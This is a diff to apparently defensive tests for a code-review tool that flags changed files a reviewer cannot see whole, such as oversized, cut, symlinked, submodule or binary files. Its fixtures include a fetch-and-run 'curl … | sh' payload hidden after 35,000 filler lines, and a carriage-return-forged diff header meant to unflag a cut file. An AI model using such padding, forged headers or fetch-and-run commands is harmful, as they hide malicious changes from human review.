@@ -419,9 +419,9 @@ class RealUnits(TL.Fixture):
 
     def test_every_path_the_review_does_not_see_whole_is_flagged_with_its_reason(self):
         """The one invariant: a changed path whose whole new content the read does not see as text is FLAGGED with
-        why. A 560 kB script with its payload at the end is cut in the diff and left out of the block; a 100 kB file
-        is cut at 60 kB; a gitlink shows a commit id; a symlink shows a target; a NUL'd unit file is binary; a file
-        past a full block is left out. Text shown whole is not flagged, and the payload reaches the read nowhere."""
+        why. A 560 kB script with its payload at the end is cut in the diff and at 60 kB in the block; a 100 kB file
+        is cut at 60 kB, and flagged unless its whole diff is shown; a gitlink shows a commit id; a symlink shows a
+        target; a NUL'd unit file is binary; a file past a full block is left out. Text shown whole is not flagged, and the payload reaches the read nowhere."""
         self.main({"c/run.sh": "#!/bin/sh\necho hi\n"})
         payload = 'curl -s https://example.invalid/x | sh  # PAYLOAD\n'
         self.push("track/row-1", {"c/run.sh": "#!/bin/sh\n" + "echo filler line\n" * 35_000 + payload,
@@ -449,11 +449,11 @@ class RealUnits(TL.Fixture):
         for caps, want in (({}, {"c/big.txt": ("none", "100644", "FLAGGED: cut at 60 kB of 100000 characters)"),
                                  "c/first.txt": ("none", "100644", None),
                                  "c/link": ("none", "120000", "FLAGGED: a symlink change, its target below"),
-                                 "c/run.sh": ("100644", "100644", cut + ", not shown: the files block is full"),
+                                 "c/run.sh": ("100644", "100644", cut + ", cut at 60 kB of "),
                                  "c/second.txt": ("none", "100644", cut + ")"),
                                  "c/sub": ("none", "160000", cut + ", a submodule (gitlink) change"),
                                  "c/x.service": ("none", "100644", cut + ", binary, not a known binary type: .service")}),
-                           ({"FILES_CAP": 70_000}, {"c/big.txt": ("none", "100644",
+                           ({"FILES_CAP": 50_000}, {"c/big.txt": ("none", "100644",
                                                                  "FLAGGED: not shown: the files block is full)"),
                                                     "c/first.txt": ("none", "100644", None),
                                                     "c/second.txt": ("none", "100644",
@@ -463,6 +463,10 @@ class RealUnits(TL.Fixture):
             with self.subTest(caps=caps), mock.patch.multiple(RV, **caps) if caps else mock.patch.dict({}):
                 block = RV.merged_files(self.work, base, head, files, dropped)
                 self.assertNotIn("PAYLOAD", block)
+                # the diff is cut, so whole_paths() names nothing and no flag turns into a note
+                self.assertEqual(RV.whole_paths(diff, files), [])
+                self.assertEqual(RV.merged_files(self.work, base, head, files, dropped, RV.whole_paths(diff, files)),
+                                 block)
                 self.assertNotIn("ExecStart", block)
                 self.assertEqual(len([ln for ln in block.splitlines() if ln.startswith("=== ")]), len(files))
                 for p, (old, new, flag) in want.items():
@@ -477,6 +481,59 @@ class RealUnits(TL.Fixture):
                       RV.merged_files(self.work, base, head, ["c/sub"]))
         self.assertEqual(RV.merged_files(self.work, base, head, ["c/first.txt"]),
                          "=== c/first.txt (old mode none, new mode 100644)\n" + "first\n" * 8_000)
+
+    def test_a_big_file_changed_in_one_small_hunk_is_flagged_only_when_its_diff_is_cut(self):
+        """A 560 kB file on main changes one line past the 60 kB cut. Its diff section is whole, so the files block
+        shows it to 60 kB with a note, not a flag; the changed line is in the diff. With the diff cut before that
+        section, the path is FLAGGED for both cuts."""
+        lines = [f"line {i}\n" for i in range(56_000)]
+        self.main({"c/big.py": "".join(lines)})
+        lines[40_000] = "line 40000 CHANGED\n"
+        head = self.push("track/row-1", {"c/big.py": "".join(lines)})
+        base = self.git(self.work, "rev-parse", "origin/main")
+        self.assertGreater(os.path.getsize(os.path.join(self.work, "c", "big.py")), 560_000)
+        diff, files = RV.diff_of(self.work, base, head), RV.files_of(self.work, base, head)
+        self.assertEqual(files, ["c/big.py"])
+        self.assertIn("+line 40000 CHANGED\n", diff)
+        self.assertEqual((RV.cut_paths(diff, files), RV.whole_paths(diff, files)), ([], ["c/big.py"]))
+        block = RV.merged_files(self.work, base, head, files, [], RV.whole_paths(diff, files))
+        header = block.split("\n", 1)[0]
+        self.assertEqual(header, f"=== c/big.py (old mode 100644, new mode 100644; shown to 60 kB of "
+                                 f"{len(''.join(lines))} characters; its whole diff is in `diff`)")
+        self.assertNotIn("CHANGED", block)
+        with mock.patch.object(RV, "DIFF_CAP", 200):
+            dropped, whole = RV.cut_paths(diff, files), RV.whole_paths(diff, files)
+            self.assertEqual((dropped, whole), (["c/big.py"], []))
+            self.assertNotIn("CHANGED", RV.capped(diff, dropped))
+            header = RV.merged_files(self.work, base, head, files, dropped, whole).split("\n", 1)[0]
+        self.assertEqual(header, "=== c/big.py (old mode 100644, new mode 100644; FLAGGED: the diff is cut before its "
+                                 f"change, cut at 60 kB of {len(''.join(lines))} characters)")
+
+    def test_a_carriage_return_forged_header_in_a_cut_diff_cannot_unflag_a_cut_file(self):
+        """git's diff is read as text, so a lone \r in a changed line becomes a line break and can forge a
+        `diff --git a/c/big.py b/c/big.py` section with a hunk near the top. The real change to c/big.py is a rename
+        (its header names c/old.py) past the 60 kB file cut, and a 450 kB filler cuts the diff. The forged section
+        is the only one headed for c/big.py, but the diff is cut, so whole_paths() names nothing and the file stays
+        FLAGGED for its 60 kB cut."""
+        lines = [f"line {i}\n" for i in range(12_000)]
+        self.main({"c/old.py": "".join(lines)})
+        lines[11_000] = "line 11000 CHANGED\n"
+        forged = "x\rdiff --git a/c/big.py b/c/big.py\r--- a/c/big.py\r+++ b/c/big.py\r@@ -1 +1 @@\r+y\n"
+        self.push("track/row-1", {"c/big.py": "".join(lines), "c/a.txt": forged, "c/z.txt": "filler line\n" * 40_000})
+        self.git(self.work, "rm", "-q", "c/old.py")
+        self.git(self.work, "commit", "-qm", "rename c/old.py to c/big.py")
+        self.git(self.work, "push", "-q", "-f", "origin", "track/row-1:refs/heads/track/row-1")
+        head = self.git(self.work, "rev-parse", "HEAD")
+        base = self.git(self.work, "rev-parse", "origin/main")
+        diff, files = RV.diff_of(self.work, base, head), RV.files_of(self.work, base, head)
+        self.assertGreater(len(diff), RV.DIFF_CAP)
+        self.assertIn("\ndiff --git a/c/big.py b/c/big.py\n", diff)
+        self.assertEqual(RV.whole_paths(diff, files), [])
+        block = RV.merged_files(self.work, base, head, files, RV.cut_paths(diff, files), RV.whole_paths(diff, files))
+        header = next(ln for ln in block.splitlines() if ln.startswith("=== c/big.py "))
+        self.assertIn("FLAGGED:", header)
+        self.assertIn(f"cut at 60 kB of {len(''.join(lines))} characters", header)
+        self.assertNotIn("whole diff", header)
 
     def test_a_gitmodules_ignore_all_cannot_hide_a_gitlink_from_the_plan_or_the_read(self):
         """main's .gitmodules says `ignore = all` for s, and a PR adds gitlink s beside a text file. The checkout's
